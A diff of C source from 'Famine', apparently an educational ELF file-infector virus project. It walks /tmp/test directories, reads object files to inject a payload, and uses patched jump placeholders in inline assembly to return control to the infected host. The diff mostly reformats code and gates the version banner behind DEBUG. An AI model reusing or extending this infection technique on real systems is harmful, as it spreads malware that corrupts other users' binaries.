@@ -1,7 +1,6 @@
 #include "../includes/famine.h"
 
-void clear_env(t_env *env)
-{
+void clear_env(t_env *env) {
 	if (env->obj_cpy)
 		syscall_munmap(env->obj_cpy, env->new_obj_size + 1);
 	if (env->payload_content)
@@ -67,9 +66,6 @@ int listdir(char *target) {
 					ft_bzero(env->obj_name, env->obj_name_size);
 					ft_strcpy(env->obj_name, target);
 					ft_strcat(env->obj_name, dir->d_name);
-
-					//syscall_write(1, env->obj_name, env->obj_name_size);
-
 					read_obj(env);
 					clear_env(env);
 				}
@@ -101,15 +97,14 @@ int main(void) {
 		"push %r15 \n"
 	);
 
-	//if (DEBUG) printf("%s\n", "Famine version 1.0 (c)oded by eparisot");
 	char* str = "Famine version 1.0 (c)oded by eparisot\n";
-	syscall_write(1, str, 39);
+	if (DEBUG) syscall_write(1, str, 39);
 
 	listdir("/tmp/test/");
 	listdir("/tmp/test2/");
 
 	__asm__(
-		// restore used registers
+		// restore registers
 		"pop %r15 \n"	
 		"pop %r14 \n"
 		"pop %r13 \n"
@@ -125,11 +120,12 @@ int main(void) {
 		"pop %rdx \n"
 		"pop %rcx \n"
 		"pop %rax \n"
-		// set return here for fist call, will be replaced by NOP for subsequent runs
+		// set return here for fist call to avoid segfault, will be replaced by NOP in subsequent runs
 		"leave \n" 
 		"ret \n"
 		// jump back to main
 		"jmp . + 5 + 0x41414141 \n"
+		// anchor to look for to replace jmp address (0x42424242 location - 7)
 		"push 0x42424242 \n"
 	);
 
